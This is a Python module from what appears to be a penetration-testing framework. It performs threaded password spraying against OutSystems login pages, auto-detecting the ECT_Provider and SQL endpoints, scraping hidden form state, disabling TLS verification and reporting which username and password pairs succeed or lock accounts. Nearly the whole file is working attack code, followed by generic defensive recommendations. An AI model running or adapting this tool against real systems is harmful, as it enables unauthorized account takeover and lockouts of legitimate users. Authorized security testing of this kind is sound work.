"""
Password Spray module for OSX Framework
Tests OutSystems login endpoints (ECT_Provider and SQL) for weak credentials
"""

import requests
import urllib3
from urllib.parse import urlparse, urljoin
import threading
import time
from pathlib import Path
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class PasswordSpray:
    """Password spray testing for OutSystems applications"""
    
    description = "Password spray testing for OutSystems login endpoints (Users, ECT_Provider and SQL)"
    
    options = {
        'TARGET': { # Added dummy target for quick testing
            'value': '',
            'required': True,
            'description': 'Target OutSystems application URL'
        },
        'USERS_FILE': {
            'value': '', # DUMMY VALUE
            'required': True,
            'description': 'Path to file containing usernames to test'
        },
        'PASSWORD': {
            'value': '', # DUMMY VALUE
            'required': True,
            'description': 'Password to spray against all users'
        },
        'LOGIN_TYPE': {
            'value': 'auto', # DUMMY VALUE
            'required': False,
            'description': 'Login type: auto, Users, ECT, SQL (auto detects available endpoints)'
        },
        'DELAY': {
            'value': '0.5', # DUMMY VALUE
            'required': False,
            'description': 'Delay between requests in seconds'
        }
    }
    
    def __init__(self, options):
        self.options = options
        self.target = options.get('TARGET', '')
        self.users_file = options.get('USERS_FILE', '')
        self.password = options.get('PASSWORD', '')
        self.login_type = options.get('LOGIN_TYPE', 'auto').upper()
        self.threads = int(options.get('THREADS', 10))
        self.timeout = int(options.get('TIMEOUT', 30))
        self.delay = float(options.get('DELAY', 1))
        self.user_agent = options.get('USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        self.proxy = options.get('PROXY', '') # Retrieve proxy from options
        self.workspace_manager = options.get('WORKSPACE_MANAGER')
        
        # Results storage
        self.results = {
            'target': self.target,
            'successful_logins': [],
            'failed_logins': [],
            'locked_accounts': [],
            'errors': [],
            'login_endpoints': []
        }
        
        # Threading
        self.lock = threading.Lock()
        self.successful_count = 0
        self.failed_count = 0
        self.locked_count = 0
        self.error_count = 0
        
    def _get_requests_kwargs(self):
        """Helper to get common requests arguments including headers and proxies."""
        kwargs = {
            'headers': {"User-Agent": self.user_agent},
            'verify': False,
            'timeout': self.timeout
        }
        if self.proxy:
            kwargs['proxies'] = {
                'http': self.proxy,
                'https': self.proxy
            }
        return kwargs

    def run(self):
        """Execute the password spray module"""
        if not self.target:
            print("[-] TARGET not set")
            return
            
        if not self.users_file:
            print("[-] USERS_FILE not set")
            return
            
        if not self.password:
            print("[-] PASSWORD not set")
            return
            
        # Load users from file
        users = self._load_users()
        if not users:
            return
            
        print(f"[*] Target: {self.target}")
        print(f"[*] Users loaded: {len(users)}")
        print(f"[*] Password: {self.password}")
        print(f"[*] Threads: {self.threads}")
        if self.proxy:
            print(f"[*] Using proxy: {self.proxy}")
        
        
        # Detect available login endpoints
        available_endpoints = self._detect_login_endpoints()
        if not available_endpoints:
            print("[-] No login endpoints found")
            return
            
        # Choose login endpoint
        endpoint_to_use = self._choose_endpoint(available_endpoints)
        if not endpoint_to_use:
            return
            
        print(f"[*] Using login endpoint: {endpoint_to_use['type']}")
        print(f"[*] URL: {endpoint_to_use['url']}")
        
        
        # Start password spraying
        self._start_password_spray(users, endpoint_to_use)
        
        # Display results
        self._display_results()
        
        # Save results if requested
        if self.workspace_manager:
            self._save_to_workspace()
    
    def _load_users(self):
        """Load users from file"""
        try:
            users_path = Path(self.users_file)
            if not users_path.exists():
                print(f"[-] Users file not found: {self.users_file}")
                return []
                
            with open(users_path, 'r') as f:
                users = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
            print(f"[+] Loaded {len(users)} users from {self.users_file}")
            return users
            
        except Exception as e:
            print(f"[-] Error loading users file: {e}")
            return []
   
    def _detect_login_endpoints(self):
        """Detect available login endpoints"""
        print("[*] Detecting available login endpoints...")
        
        endpoints = []
        base_url = self.target.rstrip('/')
        parsed = urlparse(base_url)
        domain = f"{parsed.scheme}://{parsed.netloc}"
        
        # Test ECT_Provider endpoint
        ect_url = f"{domain}/ECT_Provider/Login.aspx"
        if self._test_endpoint(ect_url):
            endpoints.append({
                'type': 'ECT',
                'url': ect_url,
                'name': 'ECT_Provider'
            })
            print(f"[+] Found ECT_Provider endpoint: {ect_url}")
        
        # Test SQL endpoint
        sql_url = f"{domain}/SQL/Login.aspx"
        if self._test_endpoint(sql_url):
            endpoints.append({
                'type': 'SQL',
                'url': sql_url,
                'name': 'SQL'
            })
            print(f"[+] Found SQL endpoint: {sql_url}")
       
        self.results['login_endpoints'] = endpoints
        return endpoints
   
    def _test_endpoint(self, url):
        """Test if login endpoint is accessible"""
        try:
            kwargs = self._get_requests_kwargs()
            response = requests.get(url, **kwargs)
            
            # Check if it's a login page
            if response.status_code == 200:
                content = response.text.lower()
                if any(keyword in content for keyword in ['login', 'password', 'username', 'signin']):
                    return True
            return False
            
        except Exception:
            return False
   
    def _choose_endpoint(self, available_endpoints):
        """Choose which endpoint to use"""
        if not available_endpoints:
            return None
            
        if self.login_type == 'AUTO':
            if len(available_endpoints) == 1:
                return available_endpoints[0]
            else:
                print("\n[*] Multiple endpoints found:")
                for i, endpoint in enumerate(available_endpoints, 1):
                    print(f"   {i}. {endpoint['name']} - {endpoint['url']}")
                
                try:
                    choice = input("\nSelect endpoint (1-{}): ".format(len(available_endpoints)))
                    choice_idx = int(choice) - 1
                    if 0 <= choice_idx < len(available_endpoints):
                        return available_endpoints[choice_idx]
                    else:
                        print("[-] Invalid choice")
                        return None
                except (ValueError, KeyboardInterrupt):
                    print("[-] Invalid input")
                    return None
        else:
            # User specified login type
            for endpoint in available_endpoints:
                if endpoint['type'] == self.login_type:
                    return endpoint
            
            print(f"[-] Specified login type '{self.login_type}' not found")
            return None
   
    def _start_password_spray(self, users, endpoint):
        """Start password spraying with threading"""
        print(f"[*] Starting password spray with {self.threads} threads...")
        print(f"[*] Delay between requests: {self.delay} seconds")
        
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for user in users:
                future = executor.submit(self._test_login, user, self.password, endpoint)
                futures.append(future)
                
                # Add delay between submissions
                if self.delay > 0:
                    time.sleep(self.delay / self.threads)
            
            # Wait for all threads to complete
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    with self.lock:
                        self.error_count += 1
                        self.results['errors'].append(str(e))
        
        elapsed_time = time.time() - start_time
        print(f"\n[*] Password spray completed in {elapsed_time:.2f} seconds")
   
    def _test_login(self, username, password, endpoint):
        """Test login for a specific user"""
        try:
            if endpoint['type'] == 'ECT':
                result = self._test_ect_login(username, password, endpoint['url'])
            elif endpoint['type'] == 'SQL':
                result = self._test_sql_login(username, password, endpoint['url'])
            else:
                return False
            
            with self.lock:
                if result == 'success':
                    self.successful_count += 1
                    self.results['successful_logins'].append({
                        'username': username,
                        'password': password,
                        'endpoint': endpoint['url']
                    })
                    print(f"[+] SUCCESS: {username}:{password} @ {endpoint['type']}")
                elif result == 'locked':
                    self.locked_count += 1
                    self.results['locked_accounts'].append({
                        'username': username,
                        'endpoint': endpoint['url']
                    })
                    print(f"[!] LOCKED: {username} @ {endpoint['type']} - Too many failed login attempts")
                else:  # failed
                    self.failed_count += 1
                    self.results['failed_logins'].append({
                        'username': username,
                        'password': password,
                        'endpoint': endpoint['url']
                    })
                    print(f"[-] FAILED: {username}:{password} @ {endpoint['type']}")
            
            return result == 'success'
            
        except Exception as e:
            with self.lock:
                self.error_count += 1
                self.results['errors'].append(f"Error testing {username}: {str(e)}")
                print(f"[!] ERROR: {username} - {str(e)}")
            return False
   
    def _test_ect_login(self, username, password, url):
        """Test ECT_Provider login"""
        try:
            session = requests.Session()
            session.verify = False
            
            kwargs = self._get_requests_kwargs()
            # Get login page first to extract form data
            response = session.get(url, **kwargs)
            
            if response.status_code != 200:
                print(f"[-] ECT Login: Failed to get login page, status code: {response.status_code}")
                return 'failed'
            
            # Extract form data
            form_data = self._extract_ect_form_data(response.text, username, password)
            if not form_data:
                print(f"[-] ECT Login: Failed to extract form data for {username} at {url}")
                return 'failed'
            
            # Submit login - don't follow redirects to catch 302
            post_headers = kwargs['headers'].copy()
            post_headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': urlparse(url).scheme + '://' + urlparse(url).netloc,
                'Referer': url
            })
            
            login_response = session.post(url, data=form_data, headers=post_headers, 
                                        timeout=self.timeout, allow_redirects=False,
                                        proxies=kwargs.get('proxies')) # Pass proxies explicitly
            
            # Check for successful login (302 redirect)
            if login_response.status_code == 302:
                location = login_response.headers.get('Location', '')
                # Make sure it's not redirecting back to login page
                if 'login' not in location.lower():
                    return 'success'
            
            # Check response content for locked account or invalid credentials (case-insensitive)
            content = login_response.text.lower()
            if 'too many failed login attempts.' in content:
                return 'locked'
            elif 'invalid username or password' in content:
                return 'failed'
            
            # If not 302 and no specific error message, it's a failed login
            return 'failed'
            
        except Exception as e:
            raise Exception(f"ECT login error: {str(e)}")
   
    def _test_sql_login(self, username, password, url):
        """Test SQL login"""
        try:
            session = requests.Session()
            session.verify = False
            
            kwargs = self._get_requests_kwargs()
            # Get login page first to extract form data
            response = session.get(url, **kwargs)
            
            if response.status_code != 200:
                print(f"[-] SQL Login: Failed to get login page, status code: {response.status_code}")
                return 'failed'
            
            # Extract form data
            form_data = self._extract_sql_form_data(response.text, username, password)
            if not form_data:
                print(f"[-] SQL Login: Failed to extract form data for {username} at {url}")
                return 'failed'
            
            # Submit login - don't follow redirects to catch 302
            post_headers = kwargs['headers'].copy()
            post_headers.update({
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': urlparse(url).scheme + '://' + urlparse(url).netloc,
                'Referer': url
            })
            
            login_response = session.post(url, data=form_data, headers=post_headers, 
                                        timeout=self.timeout, allow_redirects=False,
                                        proxies=kwargs.get('proxies')) # Pass proxies explicitly
            
            # Check for successful login (302 redirect)
            if login_response.status_code == 302:
                location = login_response.headers.get('Location', '')
                # Make sure it's not redirecting back to login page
                if 'login' not in location.lower():
                    return 'success'
            
            # Check response content for locked account or invalid credentials (case-insensitive)
            content = login_response.text.lower()
            if 'too many failed login attempts.' in content:
                return 'locked'
            elif 'invalid username or password' in content:
                return 'failed'
            
            # If not 302 and no specific error message, it's a failed login
            return 'failed'
            
        except Exception as e:
            raise Exception(f"SQL login error: {str(e)}")
   
    def _extract_attributes_from_tag(self, tag_string):
        """Helper to extract name and value from a single input tag string, robustly."""
        name_match = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag_string)
        value_match = re.search(r'value\s*=\s*["\']([^"\']*)["\']', tag_string)
        return name_match.group(1) if name_match else None, \
               value_match.group(1) if value_match else None

    def _extract_ect_form_data(self, html_content, username, password):
        """Dynamically extract form data for ECT_Provider login, with static additions."""
        form_data = {}
        
        # Step 1: Find all input tags
        input_tags = re.findall(r'<input[^>]*?(?:\/>|>)', html_content, re.IGNORECASE)

        for tag in input_tags:
            # Step 2: Check if it's a hidden input
            if 'type="hidden"' in tag.lower():
                name, value = self._extract_attributes_from_tag(tag)
                if name:
                    form_data[name] = value

        # Dynamically find username input name (type="text" or type="email")
        username_input_match = re.search(r'<input[^>]+name\s*=\s*["\']([^"\']+)["\'][^>]+(?:type\s*=\s*["\']text["\']|type\s*=\s*["\']email["\'])[^>]*?(?:\/>|>)', html_content, re.IGNORECASE)
        username_field_name = username_input_match.group(1) if username_input_match else None

        # Dynamically find password input name (type="password")
        password_input_match = re.search(r'<input[^>]+name\s*=\s*["\']([^"\']+)["\'][^>]+type\s*=\s*["\']password["\'][^>]*?(?:\/>|>)', html_content, re.IGNORECASE)
        password_field_name = password_input_match.group(1) if password_input_match else None

        # Check if essential fields are found
        if not username_field_name:
            print("    [!] ECT Form Data: Username input field not found.")
            return None
        if not password_field_name:
            print("    [!] ECT Form Data: Password input field not found.")
            return None
        
        # Check for at least one of the state variables
        osvstate_val = form_data.get('__OSVSTATE')
        viewstate_val = form_data.get('__VIEWSTATE')

        if not (osvstate_val or viewstate_val):
            print("    [!] ECT Form Data: Neither __OSVSTATE nor __VIEWSTATE found.")
            return None

        # Populate form_data with extracted values
        form_data[username_field_name] = username
        form_data[password_field_name] = password
        
        # Add static parameters as requested
        form_data['wt4$wtMainContent$wt14'] = 'on'
        form_data['wt4$wtMainContent$wtLoginButton'] = 'Login'

        return form_data
   
    def _extract_sql_form_data(self, html_content, username, password):
        """Dynamically extract form data for SQL login."""
        form_data = {}
        
        # Step 1: Find all input tags
        input_tags = re.findall(r'<input[^>]*?(?:\/>|>)', html_content, re.IGNORECASE)

        for tag in input_tags:
            if 'type="hidden"' in tag.lower():
                name, value = self._extract_attributes_from_tag(tag)
                if name:
                    form_data[name] = value

        # Dynamically find username input name (type="text" or type="email")
        username_input_match = re.search(r'<input[^>]+name\s*=\s*["\']([^"\']+)["\'][^>]+(?:type\s*=\s*["\']text["\']|type\s*=\s*["\']email["\'])[^>]*?(?:\/>|>)', html_content, re.IGNORECASE)
        username_field_name = username_input_match.group(1) if username_input_match else None

        # Dynamically find password input name (type="password")
        password_input_match = re.search(r'<input[^>]+name\s*=\s*["\']([^"\']+)["\'][^>]+type\s*=\s*["\']password["\'][^>]*?(?:\/>|>)', html_content, re.IGNORECASE)
        password_field_name = password_input_match.group(1) if password_input_match else None

        # Check if essential fields are found
        if not username_field_name:
            print("    [!] SQL Form Data: Username input field not found.")
            return None
        if not password_field_name:
            print("    [!] SQL Form Data: Password input field not found.")
            return None
        
        # Check for at least one of the state variables
        osvstate_val = form_data.get('__OSVSTATE')
        viewstate_val = form_data.get('__VIEWSTATE')

        if not (osvstate_val or viewstate_val):
            print("    [!] SQL Form Data: Neither __OSVSTATE nor __VIEWSTATE found.")
            return None

        # Populate form_data with extracted values
        form_data[username_field_name] = username
        form_data[password_field_name] = password
        
        # Note: No static button/checkbox parameters added for SQL as they were not specified.
        # If the SQL login form requires specific static parameters, they would need to be added here.

        return form_data
   
    def _display_results(self):
        """Display password spray results"""
        
        print("=" * 60)
        print("PASSWORD SPRAY RESULTS")
        print("=" * 60)
        
        total_attempts = self.successful_count + self.failed_count + self.locked_count
        print(f"Total attempts: {total_attempts}")
        print(f"Successful logins: {self.successful_count}")
        print(f"Failed logins: {self.failed_count}")
        print(f"Locked accounts: {self.locked_count}")
        print(f"Errors: {self.error_count}")
        
        
        if self.results['successful_logins']:
            print("SUCCESSFUL LOGINS:")
            print("-" * 40)
            for login in self.results['successful_logins']:
                print(f"[+] {login['username']}:{login['password']} @ {login['endpoint']}")
            
        
        if self.results['locked_accounts']:
            print("LOCKED ACCOUNTS:")
            print("-" * 40)
            for account in self.results['locked_accounts']:
                print(f"[!] {account['username']} @ {account['endpoint']}")
            
        
        if self.results['errors']:
            print("ERRORS:")
            print("-" * 40)
            for error in self.results['errors'][:10]:  # Show first 10 errors
                print(f"[!] {error}")
            if len(self.results['errors']) > 10:
                print(f"[!] ... and {len(self.results['errors']) - 10} more errors")
            
        
        # Security recommendations
        print("SECURITY RECOMMENDATIONS:")
        print("-" * 40)
        if self.results['successful_logins']:
            print("- Change passwords for successful login accounts immediately")
            print("- Implement stronger password policies")
        if self.results['locked_accounts']:
            print("- Review locked accounts for potential brute force attempts")
            print("- Consider implementing account lockout notifications")
        print("- Implement rate limiting on login endpoints")
        print("- Monitor for suspicious login patterns")
        print("- Consider implementing multi-factor authentication")
    
    def _save_to_workspace(self):
        """Save results to workspace"""
        try:
            result_file = self.workspace_manager.save_scan_results('password_spray', self.results)
            print(f"[+] Results saved to workspace: {result_file}")
        except Exception as e:
            print(f"[-] Error saving to workspace: {e}")
